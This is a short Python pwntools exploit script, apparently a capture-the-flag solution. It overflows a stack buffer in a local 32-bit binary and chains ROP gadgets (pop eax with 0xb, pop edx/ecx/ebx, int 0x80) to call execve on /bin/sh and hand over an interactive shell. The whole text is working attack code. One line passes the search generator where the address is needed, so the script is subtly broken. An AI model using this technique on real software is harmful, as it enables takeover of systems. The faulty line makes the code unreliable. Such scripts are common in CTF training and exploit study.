from pwn import *
context.log_level = 'debug'

elf   = ELF('./a.out')
r = process('./a.out')

pop_eax_ret         = 0x80bb196
pop_edx_ecx_ebx_ret = 0x806eb90

bin_sh = elf.search('/bin/sh\x00')
bin_sh_addr = next(bin_sh, None)
if bin_sh_addr is None:
    print("[-] Can't find /bin/sh str")
    exit(0)
    
print("bin_sh=>",bin_sh_addr)

int_0x80 = 0x8049421

payload  = b'a'*0x6c + b'b'*4
payload += p32(pop_eax_ret) + p32(0xb)
payload += p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0) + p32(bin_sh)
payload += p32(int_0x80)

r.sendline(payload)
r.interactive()
